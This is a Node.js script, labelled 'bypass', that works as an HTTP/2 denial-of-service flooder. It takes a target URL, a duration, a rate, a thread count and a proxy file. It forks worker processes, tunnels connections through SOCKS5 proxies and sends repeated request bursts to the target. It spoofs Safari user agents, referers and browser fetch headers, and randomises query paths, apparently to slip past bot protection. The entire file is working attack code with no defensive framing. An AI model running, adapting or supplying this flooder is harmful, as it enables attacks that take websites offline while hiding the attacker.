//bypass
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const { SocksClient } = require("socks");
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});
if (process.argv.length < 7){
    console.log(`node safarii.js [target] [time] [rate] [thread] [proxy] --extra --ref --path`);
    process.exit();
}
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}
function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    extra: process.argv.includes('--extra'), // Проверка флага
    refFlag: process.argv.includes('--ref'),
    pathFlag: process.argv.includes('--path')  // Добавить флаг
};
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}
class NetSocket {
    constructor(){}
    SOCKS5(options, callback) {
        const proxyParts = options.proxy.replace('socks5://', '').split(':');
        const socksOptions = {
            proxy: {
                host: proxyParts[0],
                port: parseInt(proxyParts[1]),
                type: 5
            },
            command: 'connect',
            destination: {
                host: options.address.split(':')[0],
                port: 443
            },
            timeout: options.timeout
        };
        SocksClient.createConnection(socksOptions, (err, info) => {
            if (err) {
                return callback(undefined, "error: " + err);
            }
            const connection = info.socket;
            connection.setKeepAlive(true, 60000);
            return callback(connection, undefined);
        });
    }
}
const Header = new NetSocket();
const fetch_site = ["none", "same-origin", "same-site", "cross-site"];
const languages = [
    "en-US",
    "en-GB",
    "en",
    "de",
    "fr",
    "es",
    "pt-BR",
    "it",
    "ru",
    "ja",
    "nl",
    "pl",
    "ko",
    "tr",
    "sv"
];
const referers = [
    "https://www.reddit.com/r/programming/",
    "https://news.ycombinator.com/",
    "https://stackoverflow.com/questions/",
    "https://github.com/trending",
    "https://dev.to/",
    "https://medium.com/",
    "https://www.producthunt.com/",
    "https://lobste.rs/",
    "https://slashdot.org/",
    "https://www.indiehackers.com/",
    "https://techcrunch.com/",
    "https://www.theverge.com/",
    "https://arstechnica.com/",
    "https://www.wired.com/",
    "https://www.bloomberg.com/technology",
    "https://www.cnbc.com/technology/",
    "https://www.bbc.com/news/technology",
    "https://www.ft.com/technology",
    "https://www.economist.com/technology-quarterly",
    "https://www.zdnet.com/",
    "https://www.cnet.com/",
    "https://www.engadget.com/",
    "https://www.theguardian.com/technology",
    "https://www.reuters.com/technology/",
    "https://www.vice.com/en/section/tech",
    "https://www.wsj.com/tech",
    "https://www.forbes.com/technology/",
    "https://www.fastcompany.com/technology",
    "https://www.businessinsider.com/sai",
    "https://www.platformer.news/"
];
const useragents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_6_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.6 Mobile/15E148 Safari/604.1"
];
function buildHeaders() {
    let rand_path;
    if (args.pathFlag) {
        const rand_query = `?${randomString(12)}=${randomIntn(100000, 999999)}`;
        rand_path = (parsedTarget.path || "/") + rand_query;
    } else {
        rand_path = parsedTarget.path || "/";
    }
    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "sec-fetch-dest": "document",
        "user-agent": randomElement(useragents),
        "upgrade-insecure-requests": "1",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-mode": "navigate",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br"
        
    };
    if (args.extra) {
        if (Math.random() > 0.5) {
            headers["dnt"] = "1";
        }
        if (Math.random() > 0.5) {
            headers["sec-fetch-user"] = "?1";
        }
        if (Math.random() > 0.5) {
            headers["te"] = "trailers";
        }
    }
    if (args.refFlag) {
        headers["referer"] = randomElement(referers)
    }
    return headers;
}
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;
    const proxyOptions = {
        proxy: proxyAddr,
        address: parsedTarget.host + ":443",
        timeout: 500000
    };
    Header.SOCKS5(proxyOptions, (connection, error) => {
        if (error) return;
        connection.setKeepAlive(true, 60000);
        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
            ciphers: "TLS_AES_128_GCM_SHA256:TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305",
            sigalgs: "ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512",
            curves: "X25519:P-256:P-384",
            ecdhCurve: "X25519:P-256:P-384",
            minVersion: "TLSv1.2",
            maxVersion: "TLSv1.3"
        };
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 100,
                initialWindowSize: 4194304,
                enablePush: false,
            },
            maxSessionMemory: 32000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });
        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    const request = client.request(headers);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                        return
                    });
                    request.end();
                }
            }, 1000);
        });
        client.on("close", () => {
            client.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
